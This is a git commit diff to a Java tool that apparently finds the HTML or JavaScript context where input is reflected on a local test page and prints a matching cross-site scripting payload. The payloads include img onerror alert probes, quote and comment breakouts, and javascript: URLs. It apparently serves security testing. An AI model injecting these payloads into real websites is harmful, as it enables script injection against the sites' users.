fdec76710a0601f9d0dfef22487b1baf00c21af4
Vivekanandan, Karthik (kvivek) <kvivekanandan@stubhub.com>
2016-04-25 17:55:00 -0700

    attribute value quote problem

--- XSSPayload/src/Launcher.java
+++ XSSPayload/src/Launcher.java
@@ -19,22 +19,30 @@ import org.jsoup.select.NodeVisitor;
  */
 
 public class Launcher {
-	static String url = "http://localhost:9615/HTMLAttributeValue.html";
+	static String url = "http://localhost:9615/9.html";
 	static String input = "baz";
 	static String payload = "";
 
+	/*
+	 * 1 - simple HTML; <h1> 2 - attribute value, 3 cases ;3 - comments 3 cases;
+	 * 4 - attribute name ;5 - script, 3 cases ;6 - function call ;7 - js, 4
+	 * cases; 9 - urls
+	 */
 	static enum CONTEXT {
-		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE, HTML_COMMENTS, JS_FUNC, JS_SINGLE_QUOTES, JS_DOUBLE_QUOTES, JS_SINGLE_COMMENT, JS_MULTI_COMMENT, CSS_CONTEXT
+		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE, HTML_COMMENTS, JS_FUNC, JS_SINGLE_QUOTES, JS_DOUBLE_QUOTES, JS_SINGLE_COMMENT, JS_MULTI_COMMENT, CSS_CONTEXT, URLS
 	};
 
+	static String urlAttributes = "";
 	static CONTEXT context = null;
 
 	public static void main(String[] args) {
 		try {
 			Document doc = Jsoup.connect(url).get();
+			String strDocument = doc.toString();
 			doc.traverse(new NodeVisitor() {
 				@Override
 				public void head(Node node, int arg1) {
+					context = null;
 					if (node instanceof TextNode) {
 						TextNode tn = (TextNode) node;
 						if (!tn.isBlank()) {
@@ -103,9 +111,34 @@ public class Launcher {
 								context = CONTEXT.HTML_ATTRIBUTE_NAME;
 							}
 							if (a.getValue() != null && a.getValue().equals(input)) {
-								System.out.println("ELEMENT NODENAME:" + e.nodeName());
-								System.out.println("attribute:: " + a.getKey() + " :: value is equal to input");
-								context = CONTEXT.HTML_ATTRIBUTE_VALUE;
+
+								if ((e.nodeName().equals("a") || e.nodeName().equals("base") || e.nodeName().equals("link")) && a.getKey().equals("href")) {
+									context = CONTEXT.URLS;
+								} else if ((e.nodeName().equals("script") || e.nodeName().equals("iframe") || e.nodeName().equals("frame") || e.nodeName().equals("embed")|| e.nodeName().equals("input") 
+										|| e.nodeName().equals("audio")|| e.nodeName().equals("video") || e.nodeName().equals("source")) && a.getKey().equals("src")) {
+									context = CONTEXT.URLS;
+								} else if ((e.nodeName().equals("object")) && a.getKey().equals("data")) {
+									context = CONTEXT.URLS;
+								} else if ((e.nodeName().equals("form")) && a.getKey().equals("action")) {
+									context = CONTEXT.URLS;
+								} else if ((e.nodeName().equals("button")|| e.nodeName().equals("input")) && a.getKey().equals("formaction")) {
+									context = CONTEXT.URLS;
+								} else {
+									System.out.println("ELEMENT NODENAME:" + e.nodeName());
+									System.out.println("attribute:: " + a.getKey() + " :: value is equal to input");
+									context = CONTEXT.HTML_ATTRIBUTE_VALUE;
+									String doc = strDocument;
+									String tag = e.tagName();
+									Pattern p = Pattern.compile("<"+tag+".*(\\/> | \\/"+tag+">|>)");
+									Matcher m = p.matcher(doc);
+									while(m.find()){
+										String mat = m.toString();
+										if(mat.contains(a.getKey()) && mat.contains(a.getValue())){
+											System.out.println(mat);
+										}
+									}
+								}
+
 							}
 						}
 					}
@@ -117,6 +150,44 @@ public class Launcher {
 							context = CONTEXT.HTML_COMMENTS;
 						}
 					}
+					if (context != null) {
+						switch (context) {
+						case SIMPLE_HTML:
+							payload = "<img src=x onerror=alert(1)>";
+							break;
+						case HTML_ATTRIBUTE_NAME:
+							payload = "onclick=\"alert(1)";
+							break;
+						case HTML_ATTRIBUTE_VALUE:
+							break;
+						case JS_FUNC:
+							payload = "-</script><img src=x onerror=alert(1)>";
+							break;
+						case JS_SINGLE_QUOTES:
+							payload = "';alert(1);";
+							break;
+						case JS_DOUBLE_QUOTES:
+							payload = "\";alert(2);";
+							break;
+						case JS_SINGLE_COMMENT:
+							payload = "\r\nalert(3);";
+							break;
+						case JS_MULTI_COMMENT:
+							payload = "*/alert(1);";
+							break;
+						case CSS_CONTEXT:
+							break;
+						case HTML_COMMENTS:
+							payload = "--><img src=x onerror=alert(1)>";
+							break;
+						case URLS:
+							payload = "javascript://%0Aalert%28'XSS'%29;";
+						default:
+							break;
+
+						}
+						System.out.println("PAYLOAD: " + payload);
+					}
 				}
 
 				@Override
@@ -127,39 +198,6 @@ public class Launcher {
 				}
 			});
 
-			switch (context) {
-			case SIMPLE_HTML:
-				payload = "<img src=x onerror=alert(1)>";
-				break;
-			case HTML_ATTRIBUTE_NAME:
-				payload = "onclick=\"alert(1)";
-				break;
-			case HTML_ATTRIBUTE_VALUE:
-				break;
-			case JS_FUNC:
-				payload = "-</script><img src=x onerror=alert(1)>";
-				break;
-			case JS_SINGLE_QUOTES:
-				payload = "';alert(1);";
-				break;
-			case JS_DOUBLE_QUOTES:
-				payload = "\";alert(2);";
-				break;
-			case JS_SINGLE_COMMENT:
-				payload = "\r\nalert(3);";
-				break;
-			case JS_MULTI_COMMENT:
-				payload = "*/alert(1);";
-				break;
-			case CSS_CONTEXT:
-				break;
-			case HTML_COMMENTS:
-				payload = "--><img src=x onerror=alert(1)>";
-				break;
-			default:
-				break;
-
-			}
 			// Elements elements = doc.select("*:containsOwn(" + input +")");
 			// for(Element e : elements){
 			//
